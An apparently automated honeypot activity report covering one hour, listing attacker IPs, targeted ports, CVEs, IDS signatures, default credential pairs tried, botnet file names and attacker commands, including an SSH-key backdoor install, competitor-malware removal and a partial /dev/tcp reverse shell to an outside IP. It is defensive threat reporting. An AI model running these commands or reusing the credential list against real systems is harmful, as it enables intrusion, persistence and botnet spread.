Honeypot Attack Summary Report

Report generated at: 2025-10-14T07:01:36Z
Timeframe: 2025-10-14T06:20:01Z to 2025-10-14T07:00:01Z
Files used for this report:
- agg_log_20251014T062001Z.json
- agg_log_20251014T064001Z.json
- agg_log_20251014T070001Z.json

Executive Summary
This report summarizes honeypot activity over the last hour, based on three log files. A total of 23,720 attacks were recorded. The most targeted services were SMB (TCP/445) and SIP (5060). The most common attacker IP was 31.202.67.208. A number of CVEs were targeted, with CVE-1999-0265 being the most frequent. Attackers attempted various commands, including reconnaissance and attempts to install malware.

Detailed Analysis:

Attacks by honeypot:
- Cowrie: 5849
- Suricata: 4903
- Honeytrap: 3613
- Sentrypeer: 3425
- Dionaea: 3052
- Ciscoasa: 1728
- Mailoney: 934
- Redishoneypot: 49
- H0neytr4p: 53
- Tanner: 27
- ConPot: 19
- Miniprint: 18
- Adbhoney: 14
- Honeyaml: 11
- ElasticPot: 8
- Dicompot: 9
- Wordpot: 3
- Heralding: 3
- ssh-rsa: 2

Top attacking IPs:
- 31.202.67.208: 2843
- 95.0.206.189: 1612
- 223.228.125.91: 1510
- 129.212.180.124: 1405
- 185.243.5.146: 1292
- 86.54.42.238: 821
- 185.243.5.148: 789
- 206.191.154.180: 723
- 45.236.188.4: 665
- 45.159.112.173: 377
- 172.86.95.115: 419
- 172.86.95.98: 409
- 62.141.43.183: 324
- 94.41.18.235: 300
- 154.83.16.198: 247
- 152.32.253.152: 198
- 88.210.63.16: 192
- 206.206.78.63: 193
- 37.114.49.95: 257
- 102.218.89.110: 164

Top targeted ports/protocols:
- 5060: 3425
- TCP/445: 3113
- 445: 2899
- 22: 980
- 25: 934
- 1433: 118
- 5903: 188
- 5908: 83
- 5909: 82
- 5901: 75
- UDP/5060: 70
- TCP/80: 35
- 80: 31
- 6379: 43
- 443: 45
- 5907: 48
- TCP/1433: 35
- 8000: 25
- 8086: 20
- 8083: 15

Most common CVEs:
- CVE-1999-0265
- CVE-2005-4050
- CVE-2019-11500
- CVE-2021-3449
- CVE-2021-41773
- CVE-2021-42013
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0183
- CVE-2006-2369
- CVE-2025-57819
- CVE-1999-0517
- CVE-2001-0414

Commands attempted by attackers:
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- top
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- Enter new UNIX password:
- rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;

Signatures triggered:
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- GPL ICMP redirect host
- ET SCAN NMAP -sS window 1024
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET VOIP MultiTech SIP UDP Overflow
- ET INFO Reserved Internal IP Traffic
- ET HUNTING RDP Authentication Bypass Attempt
- ET SCAN Potential SSH Scan
- ET CINS Active Threat Intelligence Poor Reputation IP group 3
- ET SCAN Suspicious inbound to MSSQL port 1433

Users / login attempts:
- 345gs5662d34/345gs5662d34
- root/123@@@
- admin/666
- test/test2003
- centos/centos333
- support/support2002
- root/Nbx20x20
- root/Datagram2018xX
- root/Call2025
- centos/6666
- nobody/nobody2004
- support/support2021
- root/Qaz123qaz
- debian/techsupport
- operator/operator2020
- nobody/nobody2025
- user/9999999
- default/default2011
- guest/default
- root/e7c3c2da

Files uploaded/downloaded:
- sh
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass

HTTP User-Agents:
- (No user agents recorded in this period)

SSH clients and servers:
- (No specific clients or servers recorded in this period)

Top attacker AS organizations:
- (No AS organizations recorded in this period)

Key Observations and Anomalies
- A high number of attacks targeting SMB (port 445) were observed, with the signature "ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication" being triggered frequently. This suggests a potential worm or automated exploit campaign.
- The command "cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."" indicates attempts to install a persistent backdoor by adding an SSH key to the authorized_keys file.
- The download of multiple ELF files with names like `arm.urbotnetisass` suggests attempts to install malware targeting various CPU architectures, likely for botnet propagation.
- The presence of CVEs from as far back as 1999 suggests that attackers are still scanning for and attempting to exploit old, well-known vulnerabilities.
- A significant number of login attempts used common or default credentials, highlighting the importance of changing default passwords.
- The command `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh` suggests an attacker attempting to remove competing malware from the system.
- The presence of the command `nohup bash -c \"exec 6<>/dev/tcp/185.208.207.9/60116 ...` indicates an attempt to establish a reverse shell and download and execute a malicious payload.
